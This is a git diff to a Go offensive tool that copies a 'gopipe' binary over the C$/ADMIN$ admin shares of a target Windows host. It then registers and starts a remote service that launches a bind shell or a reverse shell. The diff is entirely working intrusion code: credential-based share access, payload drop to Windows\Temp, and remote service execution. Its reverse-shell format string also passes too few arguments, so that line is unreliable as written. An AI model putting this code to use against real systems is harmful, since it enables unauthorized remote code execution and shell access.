@@ -29,19 +29,23 @@ const (
 	ENABLE_PROCESSED_OUTPUT            uint32 = 0x0001
 )
 
-func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int) {
+func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int, nodelete bool) {
 	// TODO - Abstract this to a helper func to reduce code duplication
 	// First, no matter what, we must copy gopipe to the target
 	fileName := getRandomString(12)
-	if name != "" {
-		fileName = name
+	if name == "" {
+		name = fileName
 	}
 
 	settings := &Settings{
-		User:        fmt.Sprintf("%s\\%s", domain, user),
-		Password:    pass,
-		TargetShare: "ADMIN$",
-		Target:      target,
+		UserSpecified: false,
+		User:          fmt.Sprintf("%s\\%s", domain, user),
+		Password:      pass,
+		TargetShare:   "ADMIN$",
+		Target:        target,
+	}
+	if user != "" {
+		settings.UserSpecified = true
 	}
 	if !EstablishConnection(settings, "C$", true) {
 		log.Printf("failed to establish connection to C$ share on %s", settings.Target)
@@ -51,7 +55,7 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 	log.Printf("Successfully connected to C$ share on %s\n", target)
 
 	// Copy gopipe to the target
-	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, fileName)
+	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, name)
 	targetFile := fmt.Sprintf(`\\%s\C$\%s`, target, targetName)
 	log.Printf("Copying gopipe to %s\n", targetFile)
 	err := copyFile("", pipebin, targetFile)
@@ -102,9 +106,9 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 			return
 		}
 		log.Printf("Successfully created service %s at %s \n", name, target)
-		cmd := fmt.Sprintf("%%COMSPEC%% /c  %s -port %d -shell %s", targetFile, port, shell)
+		cmd := fmt.Sprintf("%%COMSPEC%% /c %s -port %d -shell %s", targetFile, port, shell)
 		if reverse {
-			cmd = fmt.Sprintf("%%COMSPEC%% /c  %s -port %d -ip %s -shell %s", targetFile, port, shell)
+			cmd = fmt.Sprintf("%%COMSPEC%% /c %s -port %d -ip %s -shell %s", targetFile, port, shell)
 		}
 		log.Printf("Starting service %s at %s \n", name, target)
 		err = executeRemoteService(target, cmd, user, pass, domain, name)
